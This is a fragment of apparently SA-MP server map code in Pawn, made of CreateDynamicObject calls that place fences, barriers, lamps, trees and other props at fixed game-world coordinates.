	CreateDynamicObject(9339, 1503.14893, -1718.80176, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(9339, 1261.95862, -1816.30322, 13.25080,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9339, 1516.07336, -1679.49219, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1516.07336, -1653.37585, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1516.07336, -1627.25598, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1519.30408, -1617.10193, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1519.29968, -1682.23975, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1519.29968, -1656.12366, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1519.29968, -1630.00525, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1516.06543, -1618.69495, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1717.33643, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1714.13525, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1710.92859, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1707.73267, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1704.53125, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1701.33325, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1698.13672, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.67468, -1686.64307, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1694.93665, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1691.72656, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1688.51721, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1514.19336, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1683.43152, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1680.23071, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1677.02515, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1673.82434, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1670.61841, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1667.42004, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1664.21338, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1661.01086, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1657.80615, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1654.59875, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1651.39075, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1604.53748, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(9339, 1443.04456, -1644.79260, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1502.95325, -1605.82324, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(9339, 1456.24695, -1605.77722, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7922, 1490.40344, -1721.07922, 12.56070,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(7922, 1515.48047, -1606.50452, 12.56070,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19372, 1517.68787, -1648.18445, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1644.98145, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1641.77686, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1638.56885, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1635.36609, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1632.16333, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1628.95911, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1625.75403, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1625.75403, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1622.54688, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1619.33826, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1616.13757, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1612.93628, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1609.72876, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1606.53345, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1510.70569, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1507.21472, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1503.72620, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(9339, 1504.78479, -1602.83716, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7922, 1515.34534, -1718.27246, 12.56070,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(7922, 1440.51880, -1603.40417, 12.56070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19372, 1496.73279, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1493.23572, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1492.00244, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3517, 1464.44043, -1771.35559, 24.13830,   0.00000, 0.00000, 51.78000);
	CreateDynamicObject(737, 1517.80530, -1610.46484, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3517, 1441.41431, -1604.49915, 24.13830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1496.56641, -1604.19666, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1504.19873, -1604.19666, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19372, 1517.68787, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1514.21765, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1510.79565, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1507.39563, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1503.91479, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1500.45178, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1496.96924, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1491.55493, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(7922, 1468.75415, -1603.52478, 12.56070,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7922, 1518.73169, -1603.57996, 12.56070,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7922, 1443.59119, -1718.07434, 12.56070,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19372, 1493.50842, -1720.30176, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(7922, 1518.56665, -1721.21790, 12.56070,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3517, 1517.49304, -1604.49829, 24.13830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1610.46484, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1712.53979, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80481, -1618.25269, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.78528, -1626.03723, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1634.28357, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1642.69739, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1651.41357, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.76306, -1659.98718, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1669.20435, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1677.59705, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1686.12793, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1695.60400, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.80530, -1704.13489, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1537.55005, -1665.93994, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1537.55005, -1670.05005, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1537.55005, -1679.56995, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1537.55005, -1675.44995, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1661.79004, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1657.68005, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1653.56006, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1649.43994, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1645.31995, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1641.19995, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1683.66003, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1687.78003, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1691.90002, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1696.02002, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1700.13000, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1704.25000, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1708.37000, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1712.48999, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1714.62000, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1508.75342, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1534.64001, -1615.79004, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1611.67004, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1607.55005, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1534.64001, -1604.43005, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19425, 1526.93994, -1716.96997, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1532.19995, -1716.96997, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1532.19995, -1689.18005, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1526.94995, -1689.18005, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1526.94995, -1657.37000, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1532.34998, -1657.37000, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1532.34998, -1612.78003, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1526.81006, -1612.78003, 12.37000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 1523.27527, -1677.01575, 13.72128,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1543.11536, -1693.62000, 12.92000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1543.11536, -1689.93005, 12.92000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1543.11536, -1686.22998, 12.92000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1543.11536, -1665.07996, 12.92000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1543.11536, -1661.23999, 12.92000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1543.11536, -1657.41003, 12.92000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1411, 1542.37000, -1617.48999, 17.02000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1411, 1539.98999, -1615.06995, 17.02000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1411, 1540.00000, -1609.81995, 17.02000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1411, 1539.94995, -1605.06006, 17.02000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1411, 1542.33997, -1602.68994, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1547.60999, -1602.68005, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1552.88000, -1602.68994, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1558.14001, -1602.69995, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1563.42004, -1602.68994, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1568.69995, -1602.68994, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1573.95996, -1602.68994, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1579.25000, -1602.68005, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1584.53003, -1602.68005, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1589.81006, -1602.67004, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1595.07996, -1602.66003, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1600.35999, -1602.67004, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1605.37000, -1602.66003, 17.02000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1411, 1607.73999, -1605.04004, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1607.75000, -1610.31995, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1607.73999, -1615.60999, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1607.72998, -1620.87000, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1607.73999, -1626.14001, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1607.73999, -1631.40002, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1607.76001, -1635.31006, 17.02000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1605.40002, -1637.68994, 17.02000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1411, 1544.54626, -1620.22888, 13.97000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1411, 1544.57996, -1635.38000, 13.97000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1295, 1969.33997, -2159.44995, 12.54000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1295, 1969.33997, -2159.44995, 12.54000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1565.39001, -1622.70996, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1565.40002, -1617.73999, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1550.40002, -1622.76001, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1556.81006, -1622.75000, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1550.40002, -1617.76001, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1231, 1561.09998, -1620.31995, 13.85000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1231, 1546.75000, -1620.25000, 13.85000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1231, 1577.43005, -1620.31995, 13.85000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1231, 1570.71997, -1636.88000, 13.85000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1231, 1549.30005, -1636.82996, 13.85000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1572.29004, -1632.98999, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1565.89001, -1632.98999, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1559.48999, -1633.00000, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1553.10999, -1633.00000, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3928, 1564.19995, -1657.85999, 27.42000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3928, 1564.16003, -1648.40002, 27.42000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3928, 1564.18994, -1695.80005, 27.42000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3928, 1564.23999, -1705.08997, 27.42000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1571.79175, -1622.70996, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1571.79175, -1617.73999, 13.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(10183, 1561.83020, -1606.30469, 12.40000,   0.00000, 0.00000, 45.90003);
	CreateDynamicObject(640, 1479.54883, -1709.80469, 13.75720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(10183, 1531.05713, -1756.38013, 12.56260,   0.00000, 0.00000, 45.50000);
	CreateDynamicObject(3458, 1399.76050, -1654.84143, 14.12660,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3458, 1429.87805, -1754.19995, 14.54950,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19355, 1463.27637, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1505.37598, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1456.87244, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1453.66663, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1450.46118, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1447.24036, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1444.05969, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1522.89880, -1772.61230, 12.15010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 1439.17480, -1769.41418, 12.15010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 1440.85645, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19381, 1444.43311, -1772.65173, 13.60340,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1454.90930, -1772.64819, 13.60340,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1507.25891, -1772.65173, 13.60340,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3471, 1494.29944, -1768.70435, 14.80900,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3471, 1467.91113, -1768.70435, 14.80901,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1534.64001, -1718.73999, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1496.07605, -1746.27783, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1453.18347, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1461.78235, -1614.99841, 13.68651,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1501.42273, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1457.03870, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1460.76074, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1496.07605, -1761.78589, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1473.51587, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1477.58081, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1483.68225, -1744.19299, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1485.71472, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1489.41895, -1744.23047, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1471.18542, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1491.13086, -1744.19299, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1492.24817, -1658.10803, 13.44480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1496.07605, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1475.46118, -1744.19299, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1471.18542, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7658, 1201.52466, -1741.30286, 12.54030,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12853, 1233.42419, -1821.13879, 14.54670,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(5782, 1277.87183, -1802.81848, 14.56090,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(12947, 1282.22095, -1821.81738, 12.53140,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12951, 1204.43066, -1836.05005, 12.53680,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(8661, 1277.48206, -1822.28235, 12.55290,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9339, 1516.07336, -1705.60535, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1249.91516, -1832.29346, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1251.92993, -1842.14063, 13.25080,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9339, 1275.14880, -1829.19934, 13.25080,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1275.14880, -1829.19934, 14.65170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1261.95862, -1816.30322, 14.65170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9339, 1208.57544, -1829.19934, 14.65170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1249.90186, -1732.46399, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1209.92419, -1832.29346, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1505.09009, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1496.07605, -1759.42676, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1496.07605, -1754.74524, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1496.07605, -1750.10107, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9131, 1496.07605, -1757.11243, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1496.07605, -1752.50745, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1496.07605, -1748.21509, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1503.27515, -1744.21631, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1510.46472, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1496.07605, -1748.21509, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1496.07605, -1752.50537, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1496.07605, -1757.10449, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1496.07605, -1761.77856, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1510.46472, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1451.45776, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1466.09839, -1757.10449, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1466.09839, -1752.49182, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1466.09839, -1748.21509, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1466.09839, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1466.09839, -1746.27783, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1466.09839, -1750.10107, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1466.09839, -1754.74524, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1466.09839, -1759.42676, 13.01000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1232, 1466.09839, -1748.21509, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1466.09839, -1752.50537, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1466.09839, -1757.10449, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1466.09839, -1761.77856, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1464.38977, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1462.47095, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1458.96106, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1454.99292, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1466.11792, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1462.47095, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1458.96106, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1454.99292, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1451.45776, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1497.83252, -1744.21045, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1496.06628, -1744.19299, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1499.55151, -1744.21045, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1506.97534, -1744.21191, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1506.97534, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1503.29431, -1744.21045, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1499.55151, -1744.21240, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1481.56262, -1744.22961, 13.01000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1487.54932, -1744.19299, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1479.58130, -1744.19299, 12.77580,   0.00000, 0.00000, 0.00000);
